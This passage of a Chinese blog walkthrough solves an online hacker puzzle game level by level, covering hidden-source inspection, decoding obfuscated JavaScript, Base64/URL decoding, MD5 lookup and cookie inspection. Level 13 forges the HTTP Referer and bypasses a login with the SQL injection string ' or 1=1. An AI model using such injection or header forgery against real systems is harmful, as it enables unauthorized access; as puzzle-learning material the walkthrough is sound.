rel=\"external\">http://monyer.com/game/game1/smartboy.php</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">JTRBJTU0JTYzJTdBJTRBJTU0JTVBJTQ3JTRBJTU0JTU5JTc5JTRBJTU0JTU5JTMxJTRBJTU0JTU5JTc4JTRBJTU0JTYzJTMxJTRBJTU0JTYzJTMwJTRBJTU0JTU5JTM1JTRBJTU0JTU5JTMyJTRBJTU0JTYzJTMxJTRBJTU0JTVBJTQ0JTRBJTU0JTRBJTQ2JTRBJTU0JTYzJTc3JTRBJTU0JTU5JTM0JTRBJTU0JTYzJTc3</div></pre></td></tr></table></figure>\n<p>直觉告诉我，这显然是Base64 解密<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">%4A%54%63%7A%4A%54%5A%47%4A%54%59%79%4A%54%59%31%4A%54%59%78%4A%54%63%31%4A%54%63%30%4A%54%59%35%4A%54%59%32%4A%54%63%31%4A%54%5A%44%4A%54%4A%46%4A%54%63%77%4A%54%59%34%4A%54%63%77</div></pre></td></tr></table></figure></p>\n<p>直觉告诉我，这显然是 UrlEncode 解密</p>\n<p>JTczJTZGJTYyJTY1JTYxJTc1JTc0JTY5JTY2JTc1JTZDJTJFJTcwJTY4JTcw</p>\n<p>直觉再次告诉我，这显然是 Base64 解密</p>\n<p>%73%6F%62%65%61%75%74%69%66%75%6C%2E%70%68%70</p>\n<p>直觉再次告诉我，这显然是  UrlEncode 解密</p>\n<p>sobeautiful.php</p>\n<p>不错 密码就是sobeautiful</p>\n<h1 id=\"第十三关\"><a href=\"#第十三关\" class=\"headerlink\" title=\"第十三关\"></a>第十三关</h1><p><a href=\"http://monyer.com/game/game1/sobeautiful.php\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/sobeautiful.php</a></p>\n<blockquote>\n<p>本页禁止盗链！</p>\n</blockquote>\n<p>wtf..显然他判断了http来源，需要伪造http referer，那么我们在之前的第十二关的审查代码中加入：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>= <span class=\"string\">\"http://monyer.com/game/game1/sobeautiful.php\"</span>&gt;</span> 简便伪造referer<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div></pre></td></tr></table></figure>\n<blockquote>\n<p>欢迎您来到第13关</p>\n<p>请输入密码进入第14关：</p>\n<p>没有输入密码 或 密码错误 或 系统错误！</p>\n</blockquote>\n<p>看源代码有post提交</p>\n<p>这是一道SQL 注入题</p>\n<p>试试我大万能密码！<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&apos; or 1=1</div></pre></td></tr></table></figure></p>\n<p>万能密码熟记于心</p>\n<blockquote>\n<p>下一关密码：whatyouneverknow</p>\n</blockquote>\n<p>下一关！</p>\n<h1 id=\"第十四关\"><a href=\"#第十四关\" class=\"headerlink\" title=\"第十四关\"></a>第十四关</h1><p><a href=\"http://monyer.com/game/game1/whatyouneverknow.php\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/whatyouneverknow.php</a></p>\n<p>感谢@Echowxsy提供第14关解密过程</p>\n<p><img src=\"/content/images/monyerhack/01.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/monyerhack/02.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/monyerhack/03.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/monyerhack/1.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/monyerhack/2.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/monyerhack/3.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/monyerhack/5.jpg\" alt=\"\"></p>\n<h1 id=\"第十五关\"><a href=\"#第十五关\" class=\"headerlink\" title=\"第十五关\"></a>第十五关</h1><p><img src=\"/content/images/monyerhack/4.png\" alt=\"\"></p>\n","excerpt":"<p>之前混百度空间混久了，认识很多大牛，不乏monyer大牛。很早很早以前，他做了一个黑客小游戏，当时还不太会玩，现在突然打开发现，网站竟然还活着，决定重温经典。</p>","more":"<h1 id=\"第零关\"><a href=\"#第零关\" class=\"headerlink\" title=\"第零关\"></a>第零关</h1><p><a href=\"http://monyer.com/game/game1/\">http://monyer.com/game/game1/</a></p>\n<blockquote>\n<p>请点击链接进入第1关： 连接在左边→ ←连接在右边</p>\n</blockquote>\n<p>可是我们看不到链接地址，直接打开审查工具。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>连接在左边→<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"first.php\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>←连接在右边<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></div></pre></td></tr></table></figure>\n<p>好的输入地址，我么进入第一关</p>\n<h1 id=\"第一关\"><a href=\"#第一关\" class=\"headerlink\" title=\"第一关\"></a>第一关</h1><p><a href=\"http://monyer.com/game/game1/first.php\">http://monyer.com/game/game1/first.php</a></p>\n<p>打开页面依然是什么都没有，这很正常。审查工具看代码。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/rocketscript\"</span> <span class=\"attr\">data-rocketoptimized</span>=<span class=\"string\">\"true\"</span>&gt;</span><span class=\"javascript\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check</span>(<span class=\"params\"></span>)</span>&#123;</div><div class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'txt'</span>).value==<span class=\"string\">\"  \"</span>)&#123;</div><div class=\"line\">            <span class=\"built_in\">window</span>.location.href=<span class=\"string\">\"hello.php\"</span>;</div><div class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</div><div class=\"line\">            alert(<span class=\"string\">\"密码错误\"</span>);</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div></pre></td></tr></table></figure>\n<p>好了 我们知道密码了，并且知道下一关的文件是hello.php</p>\n<h1 id=\"第二关\"><a href=\"#第二关\" class=\"headerlink\" title=\"第二关\"></a>第二关</h1><p><a href=\"http://monyer.com/game/game1/hello.php\">http://monyer.com/game/game1/hello.php</a></p>\n<p>审查工具看源代码，head中</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/rocketscript\"</span> <span class=\"attr\">data-rocketoptimized</span>=<span class=\"string\">\"true\"</span>&gt;</span><span class=\"javascript\"></div><div class=\"line\">    <span class=\"built_in\">document</span>.oncontextmenu=<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;<span class=\"keyword\">return</span> <span class=\"literal\">false</span>&#125;;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">var</span> a,b,c,d,e,f,g;</div><div class=\"line\">    a = <span class=\"number\">3.14</span>;</div><div class=\"line\">    b = a * <span class=\"number\">2</span>;</div><div class=\"line\">    c = a + b;</div><div class=\"line\">    d = c / b + a;</div><div class=\"line\">    e = c - d * b + a;</div><div class=\"line\">    f = e + d /c -b * a;</div><div class=\"line\">    g = f * e - d + c * b + a;</div><div class=\"line\">    a = g * g;</div><div class=\"line\">    a = <span class=\"built_in\">Math</span>.floor(a);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check</span>(<span class=\"params\"></span>)</span>&#123;</div><div class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"txt\"</span>).value==a)&#123;</div><div class=\"line\">            <span class=\"built_in\">window</span>.location.href=a + <span class=\"string\">\".php\"</span>;</div><div class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</div><div class=\"line\">            alert(<span class=\"string\">\"密码错误\"</span>);</div><div class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div></pre></td></tr></table></figure>\n<p>现在是2016年了，我们不需要手算和计算器了。直接在chrome的console里输入<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">var</span> a,b,c,d,e,f,g;</div><div class=\"line\">    a = <span class=\"number\">3.14</span>;</div><div class=\"line\">    b = a * <span class=\"number\">2</span>;</div><div class=\"line\">    c = a + b;</div><div class=\"line\">    d = c / b + a;</div><div class=\"line\">    e = c - d * b + a;</div><div class=\"line\">    f = e + d /c -b * a;</div><div class=\"line\">    g = f * e - d + c * b + a;</div><div class=\"line\">    a = g * g;</div><div class=\"line\">    a = <span class=\"built_in\">Math</span>.floor(a);</div><div class=\"line\">    </div><div class=\"line\"><span class=\"number\">424178</span></div></pre></td></tr></table></figure></p>\n<p>好的我们知道a的值是424178，输入，进入下一关</p>\n<h1 id=\"第三关\"><a href=\"#第三关\" class=\"headerlink\" title=\"第三关\"></a>第三关</h1><p><a href=\"http://monyer.com/game/game1/424178.php\">http://monyer.com/game/game1/424178.php</a></p>\n<p>head中存在js</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;script type=<span class=\"string\">\"text/rocketscript\"</span> data-rocketoptimized=<span class=\"string\">\"true\"</span>&gt;</div><div class=\"line\">    <span class=\"built_in\">eval</span>(<span class=\"built_in\">String</span>.fromCharCode(<span class=\"number\">102</span>,<span class=\"number\">117</span>,<span class=\"number\">110</span>,<span class=\"number\">99</span>,<span class=\"number\">116</span>,<span class=\"number\">105</span>,<span class=\"number\">111</span>,<span class=\"number\">110</span>,<span class=\"number\">32</span>,<span class=\"number\">99</span>,<span class=\"number\">104</span>,<span class=\"number\">101</span>,<span class=\"number\">99</span>,<span class=\"number\">107</span>,<span class=\"number\">40</span>,<span class=\"number\">41</span>,<span class=\"number\">123</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">118</span>,<span class=\"number\">97</span>,<span class=\"number\">114</span>,<span class=\"number\">32</span>,<span class=\"number\">97</span>,<span class=\"number\">32</span>,<span class=\"number\">61</span>,<span class=\"number\">32</span>,<span class=\"number\">39</span>,<span class=\"number\">100</span>,<span class=\"number\">52</span>,<span class=\"number\">103</span>,<span class=\"number\">39</span>,<span class=\"number\">59</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">105</span>,<span class=\"number\">102</span>,<span class=\"number\">40</span>,<span class=\"number\">100</span>,<span class=\"number\">111</span>,<span class=\"number\">99</span>,<span class=\"number\">117</span>,<span class=\"number\">109</span>,<span class=\"number\">101</span>,<span class=\"number\">110</span>,<span class=\"number\">116</span>,<span class=\"number\">46</span>,<span class=\"number\">103</span>,<span class=\"number\">101</span>,<span class=\"number\">116</span>,<span class=\"number\">69</span>,<span class=\"number\">108</span>,<span class=\"number\">101</span>,<span class=\"number\">109</span>,<span class=\"number\">101</span>,<span class=\"number\">110</span>,<span class=\"number\">116</span>,<span class=\"number\">66</span>,<span class=\"number\">121</span>,<span class=\"number\">73</span>,<span class=\"number\">100</span>,<span class=\"number\">40</span>,<span class=\"number\">39</span>,<span class=\"number\">116</span>,<span class=\"number\">120</span>,<span class=\"number\">116</span>,<span class=\"number\">39</span>,<span class=\"number\">41</span>,<span class=\"number\">46</span>,<span class=\"number\">118</span>,<span class=\"number\">97</span>,<span class=\"number\">108</span>,<span class=\"number\">117</span>,<span class=\"number\">101</span>,<span class=\"number\">61</span>,<span class=\"number\">61</span>,<span class=\"number\">97</span>,<span class=\"number\">41</span>,<span class=\"number\">123</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">09</span>,<span class=\"number\">119</span>,<span class=\"number\">105</span>,<span class=\"number\">110</span>,<span class=\"number\">100</span>,<span class=\"number\">111</span>,<span class=\"number\">119</span>,<span class=\"number\">46</span>,<span class=\"number\">108</span>,<span class=\"number\">111</span>,<span class=\"number\">99</span>,<span class=\"number\">97</span>,<span class=\"number\">116</span>,<span class=\"number\">105</span>,<span class=\"number\">111</span>,<span class=\"number\">110</span>,<span class=\"number\">46</span>,<span class=\"number\">104</span>,<span class=\"number\">114</span>,<span class=\"number\">101</span>,<span class=\"number\">102</span>,<span class=\"number\">61</span>,<span class=\"number\">97</span>,<span class=\"number\">43</span>,<span class=\"number\">34</span>,<span class=\"number\">46</span>,<span class=\"number\">112</span>,<span class=\"number\">104</span>,<span class=\"number\">112</span>,<span class=\"number\">34</span>,<span class=\"number\">59</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">125</span>,<span class=\"number\">101</span>,<span class=\"number\">108</span>,<span class=\"number\">115</span>,<span class=\"number\">101</span>,<span class=\"number\">123</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">09</span>,<span class=\"number\">97</span>,<span class=\"number\">108</span>,<span class=\"number\">101</span>,<span class=\"number\">114</span>,<span class=\"number\">116</span>,<span class=\"number\">40</span>,<span class=\"number\">34</span>,<span class=\"number\">23494</span>,<span class=\"number\">30721</span>,<span class=\"number\">38169</span>,<span class=\"number\">35823</span>,<span class=\"number\">34</span>,<span class=\"number\">41</span>,<span class=\"number\">59</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">125</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">125</span>));</div><div class=\"line\"><span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></div></pre></td></tr></table></figure>\n<p>新时代无须解释，直接上chrome consle<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">String</span>.fromCharCode(<span class=\"number\">102</span>,<span class=\"number\">117</span>,<span class=\"number\">110</span>,<span class=\"number\">99</span>,<span class=\"number\">116</span>,<span class=\"number\">105</span>,<span class=\"number\">111</span>,<span class=\"number\">110</span>,<span class=\"number\">32</span>,<span class=\"number\">99</span>,<span class=\"number\">104</span>,<span class=\"number\">101</span>,<span class=\"number\">99</span>,<span class=\"number\">107</span>,<span class=\"number\">40</span>,<span class=\"number\">41</span>,<span class=\"number\">123</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">118</span>,<span class=\"number\">97</span>,<span class=\"number\">114</span>,<span class=\"number\">32</span>,<span class=\"number\">97</span>,<span class=\"number\">32</span>,<span class=\"number\">61</span>,<span class=\"number\">32</span>,<span class=\"number\">39</span>,<span class=\"number\">100</span>,<span class=\"number\">52</span>,<span class=\"number\">103</span>,<span class=\"number\">39</span>,<span class=\"number\">59</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">105</span>,<span class=\"number\">102</span>,<span class=\"number\">40</span>,<span class=\"number\">100</span>,<span class=\"number\">111</span>,<span class=\"number\">99</span>,<span class=\"number\">117</span>,<span class=\"number\">109</span>,<span class=\"number\">101</span>,<span class=\"number\">110</span>,<span class=\"number\">116</span>,<span class=\"number\">46</span>,<span class=\"number\">103</span>,<span class=\"number\">101</span>,<span class=\"number\">116</span>,<span class=\"number\">69</span>,<span class=\"number\">108</span>,<span class=\"number\">101</span>,<span class=\"number\">109</span>,<span class=\"number\">101</span>,<span class=\"number\">110</span>,<span class=\"number\">116</span>,<span class=\"number\">66</span>,<span class=\"number\">121</span>,<span class=\"number\">73</span>,<span class=\"number\">100</span>,<span class=\"number\">40</span>,<span class=\"number\">39</span>,<span class=\"number\">116</span>,<span class=\"number\">120</span>,<span class=\"number\">116</span>,<span class=\"number\">39</span>,<span class=\"number\">41</span>,<span class=\"number\">46</span>,<span class=\"number\">118</span>,<span class=\"number\">97</span>,<span class=\"number\">108</span>,<span class=\"number\">117</span>,<span class=\"number\">101</span>,<span class=\"number\">61</span>,<span class=\"number\">61</span>,<span class=\"number\">97</span>,<span class=\"number\">41</span>,<span class=\"number\">123</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">09</span>,<span class=\"number\">119</span>,<span class=\"number\">105</span>,<span class=\"number\">110</span>,<span class=\"number\">100</span>,<span class=\"number\">111</span>,<span class=\"number\">119</span>,<span class=\"number\">46</span>,<span class=\"number\">108</span>,<span class=\"number\">111</span>,<span class=\"number\">99</span>,<span class=\"number\">97</span>,<span class=\"number\">116</span>,<span class=\"number\">105</span>,<span class=\"number\">111</span>,<span class=\"number\">110</span>,<span class=\"number\">46</span>,<span class=\"number\">104</span>,<span class=\"number\">114</span>,<span class=\"number\">101</span>,<span class=\"number\">102</span>,<span class=\"number\">61</span>,<span class=\"number\">97</span>,<span class=\"number\">43</span>,<span class=\"number\">34</span>,<span class=\"number\">46</span>,<span class=\"number\">112</span>,<span class=\"number\">104</span>,<span class=\"number\">112</span>,<span class=\"number\">34</span>,<span class=\"number\">59</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">125</span>,<span class=\"number\">101</span>,<span class=\"number\">108</span>,<span class=\"number\">115</span>,<span class=\"number\">101</span>,<span class=\"number\">123</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">09</span>,<span class=\"number\">97</span>,<span class=\"number\">108</span>,<span class=\"number\">101</span>,<span class=\"number\">114</span>,<span class=\"number\">116</span>,<span class=\"number\">40</span>,<span class=\"number\">34</span>,<span class=\"number\">23494</span>,<span class=\"number\">30721</span>,<span class=\"number\">38169</span>,<span class=\"number\">35823</span>,<span class=\"number\">34</span>,<span class=\"number\">41</span>,<span class=\"number\">59</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">125</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">125</span>)</div></pre></td></tr></table></figure></p>\n<p>输出为<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check</span>(<span class=\"params\"></span>)</span>&#123;</div><div class=\"line\">\t<span class=\"keyword\">var</span> a = <span class=\"string\">'d4g'</span>;</div><div class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'txt'</span>).value==a)&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">window</span>.location.href=a+<span class=\"string\">\".php\"</span>;</div><div class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</div><div class=\"line\">\t\talert(<span class=\"string\">\"密码错误\"</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>好了我们知道了，密码是d4g，下一关！</p>\n<h1 id=\"第四关\"><a href=\"#第四关\" class=\"headerlink\" title=\"第四关\"></a>第四关</h1><p><a href=\"http://monyer.com/game/game1/d4g.php\">http://monyer.com/game/game1/d4g.php</a></p>\n<p>这一关非常猥琐，页面会自动跳转，稍有不注意，就跳走了。<br>打开后立即按esc停止。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;script type=<span class=\"string\">\"text/rocketscript\"</span> data-rocketoptimized=<span class=\"string\">\"true\"</span>&gt;</div><div class=\"line\">    <span class=\"built_in\">eval</span>(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">p,a,c,k,e,d</span>)</span>&#123;e=<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">c</span>)</span>&#123;<span class=\"keyword\">return</span> c.toString(<span class=\"number\">36</span>)&#125;;<span class=\"keyword\">if</span>(!<span class=\"string\">''</span>.replace(<span class=\"regexp\">/^/</span>,<span class=\"built_in\">String</span>))&#123;<span class=\"keyword\">while</span>(c--)d[c.toString(a)]=k[c]||c.toString(a);k=[<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">e</span>)</span>&#123;<span class=\"keyword\">return</span> d[e]&#125;];e=<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;<span class=\"keyword\">return</span><span class=\"string\">'\\\\w+'</span>&#125;;c=<span class=\"number\">1</span>&#125;;<span class=\"keyword\">while</span>(c--)<span class=\"keyword\">if</span>(k[c])p=p.replace(<span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(<span class=\"string\">'\\\\b'</span>+e(c)+<span class=\"string\">'\\\\b'</span>,<span class=\"string\">'g'</span>),k[c]);<span class=\"keyword\">return</span> p&#125;(<span class=\"string\">'a=\"e\";d c()&#123;b(9.8(\\'7\\').6==a)&#123;5.4.3=a+\".2\"&#125;1&#123;0(\"密码错误\")&#125;&#125;'</span>,<span class=\"number\">15</span>,<span class=\"number\">15</span>,<span class=\"string\">'alert|else|php|href|location|window|value|txt|getElementById|document||if|check|function|3bhe'</span>.split(<span class=\"string\">'|'</span>),<span class=\"number\">0</span>,&#123;&#125;))</div><div class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></div></pre></td></tr></table></figure>\n<p>显然这是一个加密的js，我们需要解密，上解密工具：</p>\n<p><a href=\"http://tool.lu/js/\">http://tool.lu/js/</a></p>\n<p>解密后：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">a = <span class=\"string\">\"3bhe\"</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check</span>(<span class=\"params\"></span>) </span>&#123;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'txt'</span>).value == a) &#123;</div><div class=\"line\">\t\t<span class=\"built_in\">window</span>.location.href = a + <span class=\"string\">\".php\"</span></div><div class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\">\t\talert(<span class=\"string\">\"密码错误\"</span>)</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>密码是 3bhe 下一关</p>\n<p>诶？怎么不对？仔细检查源代码发现下面还有一行<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">eval</span>(<span class=\"string\">\"\\141\\75\\141\\56\\164\\157\\125\\160\\160\\145\\162\\103\\141\\163\\145\\50\\51\\53\\61\\73\"</span>);</div></pre></td></tr></table></figure></p>\n<p>解密！<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">a = a.toUpperCase() + <span class=\"number\">1</span>;</div></pre></td></tr></table></figure></p>\n<p>.toUpperCase()是转换大写，所以密码是 3BHE1 下一关 go</p>\n<h1 id=\"第五关\"><a href=\"#第五关\" class=\"headerlink\" title=\"第五关\"></a>第五关</h1><p><a href=\"http://monyer.com/game/game1/3BHE1.php\">http://monyer.com/game/game1/3BHE1.php</a></p>\n<blockquote>\n<p>密码在哪儿？额，我藏在页面里了哦！</p>\n</blockquote>\n<p>这题的难点在于 找到不密码藏在哪里了 搜索了个遍 就是找不到密码 看看http头呢？</p>\n<p>找到了，在cookie里</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">monyer:the password for the next level is asdf</div></pre></td></tr></table></figure>\n<p>下一关！</p>\n<h1 id=\"第六关\"><a href=\"#第六关\" class=\"headerlink\" title=\"第六关\"></a>第六关</h1><p><a href=\"http://monyer.com/game/game1/asdf.php\">http://monyer.com/game/game1/asdf.php</a></p>\n<p>是个线索题目</p>\n<p>Get the latest fashion, beauty, dating, and health tips. Plus, win freebies, take quizzes, and check your daily horoscope! Girl Games - 9000+ Free Games for Girls …</p>\n<p>真蛋疼<br>把这个线索在网上一搜 第一个已经是一个结题方案了，看来monyer的游戏已经成功干过一个网站了。</p>\n<p>这个答案是；seventeen</p>\n<h1 id=\"第七关\"><a href=\"#第七关\" class=\"headerlink\" title=\"第七关\"></a>第七关</h1><p><a href=\"http://monyer.com/game/game1/seventeen7.php\">http://monyer.com/game/game1/seventeen7.php</a></p>\n<p>社工题</p>\n<p>先解密md5吧</p>\n<p>5e023995fb3f5e840ee684784f8f0799</p>\n<p><a href=\"http://www.somd5.com/\">http://www.somd5.com/</a></p>\n<p>解密出  eighteen8</p>\n<p>下一关</p>\n<h1 id=\"第八关\"><a href=\"#第八关\" class=\"headerlink\" title=\"第八关\"></a>第八关</h1><p><a href=\"http://monyer.com/game/game1/eighteen8.php\">http://monyer.com/game/game1/eighteen8.php</a></p>\n<p>直接看到 一个404 不要着急 审查工具</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;p style=&quot;display:none&quot;&gt;</div><div class=\"line\">第8关</div><div class=\"line\">朋友您好，第8关欢迎您！</div><div class=\"line\">我对您的聪明才智感到惊讶！</div><div class=\"line\">相信我，现在世界上85%以上的人都在你之下，</div><div class=\"line\">所以你可以大步向前，义无反顾地进行你的事业了。</div><div class=\"line\">因为只要你肯努力，不畏惧挫折，这个世界上没有难倒你的事。</div><div class=\"line\">那么继续我们的约定，我将告诉你第9关的入口：</div><div class=\"line\">10000以内所有质数和.php</div><div class=\"line\">&lt;/p&gt;</div></pre></td></tr></table></figure>\n<p>10000以内所有质数和，so easy！写个javascript 算一下。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">var sum = 0;</div><div class=\"line\">for (var i = 2; i &lt; 10000; i++) &#123;</div><div class=\"line\">\tvar flag = true;</div><div class=\"line\">\tfor (var j = 2; j &lt;= Math.sqrt(i); j++) &#123;</div><div class=\"line\">\t\tif (i % j == 0) flag = false ;</div><div class=\"line\">\t&#125;</div><div class=\"line\">    if(flag) &#123;sum = sum + i;&#125;</div><div class=\"line\">&#125;</div><div class=\"line\">console.log(sum);</div><div class=\"line\"></div><div 